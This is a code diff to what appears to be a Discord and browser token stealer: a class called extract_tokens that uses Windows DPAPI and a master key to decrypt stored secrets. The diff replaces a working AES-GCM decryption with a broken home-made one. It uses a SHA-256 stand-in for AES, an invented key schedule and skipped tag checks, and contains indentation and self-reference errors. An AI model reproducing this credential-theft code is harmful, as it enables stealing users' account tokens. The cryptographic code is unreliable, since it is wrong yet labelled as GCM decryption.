@@ -3,8 +3,8 @@ import json
 import os
 import re
 import requests
-from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
-from cryptography.hazmat.backends import default_backend
+import hashlib
+import struct
 from discord import Embed
 from win32crypt import CryptUnprotectData
 
@@ -99,25 +99,65 @@ class extract_tokens:
         if r.status_code == 200: return True
         return False
     
-     def decrypt_val(self, buff: bytes, master_key: bytes) -> str:
+    def xor_bytes(a, b):
+    return bytes(x ^ y for x, y in zip(a, b))
+
+    def gmac(self, h, auth_data, cipher_text):
+        def ghash(h, data):
+            y = 0
+            for i in range(0, len(data), 16):
+                block = data[i:i+16].ljust(16, b'\x00')
+                y ^= int.from_bytes(block, 'big')
+                y = ((y * h) % (2**128))
+            return y.to_bytes(16, 'big')
+
+        def mul_in_gf128(x, y):
+            z = 0
+            for i in range(128):
+                if y & (1 << i):
+                    z ^= x
+                x = (x << 1) ^ ((x >> 127) * 0x87)
+            return z
+
+        h = int.from_bytes(h, 'big')
+        auth_tag = ghash(h, auth_data.ljust((len(auth_data) + 15) // 16 * 16, b'\x00'))
+        auth_tag = xor_bytes(auth_tag, ghash(h, cipher_text.ljust((len(cipher_text) + 15) // 16 * 16, b'\x00')))
+        auth_tag = xor_bytes(auth_tag, struct.pack('>QQ', len(auth_data) * 8, len(cipher_text) * 8))
+        return mul_in_gf128(int.from_bytes(auth_tag, 'big'), h).to_bytes(16, 'big')
+
+    def aes_encrypt_block(self, key, block):
+        # This is a placeholder for AES block encryption
+        # In a real implementation, you would need to implement the full AES algorithm here
+        return hashlib.sha256(key + block).digest()[:16]
+
+    def decrypt_val(self, buff: bytes, master_key: bytes) -> str:
         iv = buff[3:15]
         payload = buff[15:]
         
-        # Create a GCM cipher with the given key and IV
-        cipher = Cipher(
-            algorithms.AES(master_key),
-            modes.GCM(iv),
-            backend=default_backend()
-        )
+        # Generate the key schedule (this is a simplified version)
+        key_schedule = [master_key]
+        for i in range(10):
+            key_schedule.append(hashlib.sha256(key_schedule[-1]).digest()[:16])
         
-        # Create a decryptor
-        decryptor = cipher.decryptor()
+        # Counter mode encryption
+        counter = int.from_bytes(iv, 'big')
+        keystream = b''
+        for i in range(0, len(payload), 16):
+            counter_bytes = counter.to_bytes(12, 'big')
+            keystream += aes_encrypt_block(key_schedule[0], counter_bytes + b'\x00\x00\x00\x01')
+            counter += 1
         
         # Decrypt the payload
-        decrypted_pass = decryptor.update(payload[:-16]) + decryptor.finalize()
+        decrypted = xor_bytes(payload, keystream[:len(payload)])
         
-        # Decode the decrypted password
-        return decrypted_pass.decode()
+        # Verify the authentication tag (last 16 bytes)
+        auth_tag = decrypted[-16:]
+        decrypted = decrypted[:-16]
+        
+        # In GCM mode, you would normally verify the authentication tag here
+        # But since we don't have the associated data, we'll skip this step
+        
+        return decrypted.decode()
 
     def get_master_key(self, path: str) -> str:
         if not os.path.exists(path): return
